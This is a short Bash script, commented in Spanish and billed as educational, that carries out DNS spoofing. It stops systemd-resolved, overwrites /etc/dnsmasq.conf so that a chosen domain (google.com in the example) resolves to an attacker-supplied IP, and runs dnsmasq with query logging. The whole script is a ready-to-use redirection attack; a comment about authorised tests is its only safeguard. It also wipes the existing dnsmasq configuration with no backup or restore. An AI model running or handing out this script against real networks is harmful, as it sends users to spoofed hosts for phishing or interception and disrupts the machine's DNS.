#!/bin/bash
# Script educativo de DNS Spoofing (para pruebas en red local autorizada)
# Uso: sudo ./dns_spoof.sh [IP_FALSA] [DOMINIO]

if [ "$(id -u)" != "0" ]; then
    echo "[!] Error: Debes ejecutar este script como root (sudo)." >&2
    exit 1
fi

if [ $# -ne 2 ]; then
    echo "Uso: sudo $0 [IP_FALSA] [DOMINIO]" >&2
    echo "Ejemplo: sudo $0 192.168.1.100 google.com" >&2
    exit 1
fi

IP_FALSA="$1"
DOMINIO="$2"

echo "[+] Configurando DNS Spoofing para $DOMINIO -> $IP_FALSA..."

# 1. Detener servicios DNS existentes
systemctl stop systemd-resolved 2>/dev/null

# 2. Configurar dnsmasq para redirigir el dominio
echo "address=/$DOMINIO/$IP_FALSA" > /etc/dnsmasq.conf

# 3. Iniciar dnsmasq
dnsmasq --no-daemon --log-queries &
DNS_PID=$!

echo "[+] DNS Spoofing activo. Presiona Ctrl+C para detener."

# Capturar Ctrl+C para limpiar
trap "kill $DNS_PID; echo '[+] Servidor DNS detenido.'; exit 0" INT

while true; do
    sleep 1
done
